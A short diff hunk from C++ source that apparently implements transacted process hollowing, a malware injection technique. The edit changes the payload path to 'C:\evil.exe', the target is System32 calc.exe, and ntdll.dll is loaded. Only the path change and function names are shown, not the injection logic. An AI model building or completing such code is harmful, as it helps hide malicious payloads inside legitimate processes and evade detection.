@@ -151,7 +151,7 @@ HANDLE MakeTransactedSection(BYTE* payloadBuf, DWORD dwPayloadSize) {
 }
 
 BOOL TransactedHollowing() {
-	std::wstring wPayloadPath = L"C:\\Users\\deehi\\projects\\lolgen_test\\evil.exe";
+	std::wstring wPayloadPath = L"C:\\evil.exe";
 	std::wstring wTargetPath = L"C:\\Windows\\System32\\calc.exe";
 
 	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
